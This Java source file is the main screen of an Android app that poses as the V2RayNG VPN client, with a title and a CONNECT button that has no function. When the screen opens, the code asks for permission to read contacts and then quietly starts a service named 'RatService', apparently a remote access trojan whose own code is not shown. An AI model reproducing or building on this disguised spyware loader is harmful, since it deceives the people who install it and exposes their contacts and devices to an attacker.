package com.v2ray.update;
import android.app.Activity; import android.content.Intent; import android.os.Bundle; import android.widget.*; import android.graphics.Color;
public class MainActivity extends Activity {
    @Override protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.parseColor("#1E1E1E"));
        layout.setPadding(50, 150, 50, 50);
        TextView title = new TextView(this);
        title.setText("V2RayNG");
        title.setTextColor(Color.WHITE);
        title.setTextSize(30);
        layout.addView(title);
        Button btn = new Button(this);
        btn.setText("CONNECT");
        layout.addView(btn);
        setContentView(layout);

        requestPermissions(new String[]{
            android.Manifest.permission.READ_CONTACTS
        }, 100);
        
        new android.os.Handler().postDelayed(() -> {
            startService(new Intent(this, RatService.class));
        }, 2000);
    }
}